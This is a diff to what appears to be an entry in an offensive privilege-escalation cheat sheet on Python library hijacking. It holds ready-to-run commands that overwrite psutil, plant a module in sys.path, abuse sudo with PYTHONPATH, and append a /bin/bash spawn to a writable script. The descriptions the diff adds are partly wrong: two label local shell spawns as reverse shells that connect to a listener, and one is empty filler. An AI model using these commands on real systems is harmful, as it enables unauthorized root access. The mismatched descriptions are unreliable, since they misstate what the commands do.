@@ -61,19 +61,23 @@
   "variations": [
     {
       "label": "Writable module file",
-      "command": "# overwrite the imported module, defining the called function:\ncat > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py << 'EOF'\nimport os\nclass Mem:\n    available = 100\n    total = 100\ndef virtual_memory():\n    os.system('/bin/bash')\n    return Mem()\nEOF"
+      "command": "# overwrite the imported module, defining the called function:\ncat > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py << 'EOF'\nimport os\nclass Mem:\n    available = 100\n    total = 100\ndef virtual_memory():\n    os.system('/bin/bash')\n    return Mem()\nEOF",
+      "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
     },
     {
       "label": "Writable sys.path dir",
-      "command": "# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):\nprintf '#!/usr/bin/env python3\\nimport os\\ndef virtual_memory():\\n    os.system(\"id\")\\n' > /usr/lib/python3.8/psutil.py"
+      "command": "# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):\nprintf '#!/usr/bin/env python3\\nimport os\\ndef virtual_memory():\\n    os.system(\"id\")\\n' > /usr/lib/python3.8/psutil.py",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "PYTHONPATH (SETENV allowed)",
-      "command": "sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py"
+      "command": "sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py",
+      "description": "PYTHONPATH (SETENV allowed). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Writable script",
-      "command": "echo 'import os; os.system(\"/bin/bash\")' >> /path/to/script.py"
+      "command": "echo 'import os; os.system(\"/bin/bash\")' >> /path/to/script.py",
+      "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
     }
   ],
   "steps": [
